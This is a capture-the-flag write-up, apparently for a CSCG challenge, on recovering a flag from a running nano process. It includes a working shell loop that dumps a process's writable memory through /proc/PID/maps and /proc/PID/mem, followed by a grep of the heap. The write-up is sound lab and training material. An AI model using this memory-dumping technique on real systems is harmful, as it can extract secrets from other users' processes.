
# Someone mentioned this

https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

```shell
ctf@ghost-flag-bdaqcfubxh:/home/ctf$ ls -la
ls -la
total 32
drwxr-x--- 1 ctf  ctf  4096 Mar  8 12:25 .
drwxr-xr-x 1 root root 4096 Mar  4 17:31 ..
-rw-r--r-- 1 ctf  ctf   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 ctf  ctf  3771 Jan  6  2022 .bashrc
-rw-r--r-- 1 ctf  ctf  1024 Mar  8 12:25 .flag.swp
drwxr-xr-x 3 ctf  ctf  4096 Mar  8 12:25 .local
-rw-r--r-- 1 ctf  ctf   807 Jan  6  2022 .profile
ctf@ghost-flag-bdaqcfubxh:/home/ctf$ cat .flag.swp              
cat .flag.swp
b0nano 6.2
```

`b0nano 6.2` seems interesting and could mean that someone writes to a `.flag` file in `nano`. With `TERM=linux top` we can see that `nano` runs currently with _PID 10_. Let's explore the memory of the file

```shell
56504bf27000-56504bf2c000 r--p 00000000 08:03 3432028                    /usr/bin/nano
56504bf2c000-56504bf5e000 r-xp 00005000 08:03 3432028                    /usr/bin/nano
56504bf5e000-56504bf6a000 r--p 00037000 08:03 3432028                    /usr/bin/nano
56504bf6b000-56504bf6c000 r--p 00043000 08:03 3432028                    /usr/bin/nano
56504bf6c000-56504bf6d000 rw-p 00044000 08:03 3432028                    /usr/bin/nano
56504bf6d000-56504bf6e000 rw-p 00000000 00:00 0 
56504d1bf000-56504d264000 rw-p 00000000 00:00 0                          [heap]
7f01db2f3000-7f01db2f5000 rw-p 00000000 00:00 0 
7f01db2f5000-7f01db31d000 r--p 00000000 08:03 3423724                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f01db31d000-7f01db4b2000 r-xp 00028000 08:03 3423724                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f01db4b2000-7f01db50a000 r--p 001bd000 08:03 3423724                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f01db50a000-7f01db50e000 r--p 00214000 08:03 3423724                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f01db50e000-7f01db510000 rw-p 00218000 08:03 3423724                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f01db510000-7f01db51d000 rw-p 00000000 00:00 0 
7f01db51d000-7f01db52b000 r--p 00000000 08:03 3423842                    /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7f01db52b000-7f01db53c000 r-xp 0000e000 08:03 3423842                    /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7f01db53c000-7f01db54a000 r--p 0001f000 08:03 3423842                    /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7f01db54a000-7f01db54e000 r--p 0002c000 08:03 3423842                    /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7f01db54e000-7f01db54f000 rw-p 00030000 08:03 3423842                    /usr/lib/x86_64-linux-gnu/libtinfo.so.6.3
7f01db54f000-7f01db557000 r--p 00000000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db557000-7f01db580000 r-xp 00008000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db580000-7f01db588000 r--p 00031000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db588000-7f01db589000 ---p 00039000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db589000-7f01db58a000 r--p 00039000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db58a000-7f01db58b000 rw-p 0003a000 08:03 3423788                    /usr/lib/x86_64-linux-gnu/libncursesw.so.6.3
7f01db58d000-7f01db58f000 rw-p 00000000 00:00 0 
7f01db58f000-7f01db591000 r--p 00000000 08:03 3423706                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f01db591000-7f01db5bb000 r-xp 00002000 08:03 3423706                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f01db5bb000-7f01db5c6000 r--p 0002c000 08:03 3423706                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f01db5c7000-7f01db5c9000 r--p 00037000 08:03 3423706                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f01db5c9000-7f01db5cb000 rw-p 00039000 08:03 3423706                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fff13d80000-7fff13da1000 rw-p 00000000 00:00 0                          [stack]
7fff13db6000-7fff13dba000 r--p 00000000 00:00 0                          [vvar]
7fff13dba000-7fff13dbc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

We used 

```shell
cat /proc/10/maps | grep "rw-p" | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/10/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="10_mem_$a.bin"
    done )
```

to make a memory dump. The interesting data should be on the heap.

```shell
-rw-r--r-- 1 ctf  ctf    4096 Mar  8 11:03 10_mem_56504bf6c000.bin
-rw-r--r-- 1 ctf  ctf    4096 Mar  8 11:03 10_mem_56504bf6d000.bin
-rw-r--r-- 1 ctf  ctf  675840 Mar  8 11:03 10_mem_56504d1bf000.bin
-rw-r--r-- 1 ctf  ctf    8192 Mar  8 11:03 10_mem_7f01db2f3000.bin
-rw-r--r-- 1 ctf  ctf    8192 Mar  8 11:03 10_mem_7f01db50e000.bin
-rw-r--r-- 1 ctf  ctf   53248 Mar  8 11:03 10_mem_7f01db510000.bin
-rw-r--r-- 1 ctf  ctf    4096 Mar  8 11:03 10_mem_7f01db54e000.bin
-rw-r--r-- 1 ctf  ctf    4096 Mar  8 11:03 10_mem_7f01db58a000.bin
-rw-r--r-- 1 ctf  ctf    8192 Mar  8 11:03 10_mem_7f01db58d000.bin
-rw-r--r-- 1 ctf  ctf    8192 Mar  8 11:03 10_mem_7f01db5c9000.bin
```

All in all, we can run `grep -ai "CSCG" 10_mem_56504d1bf000.bin` and find the flag.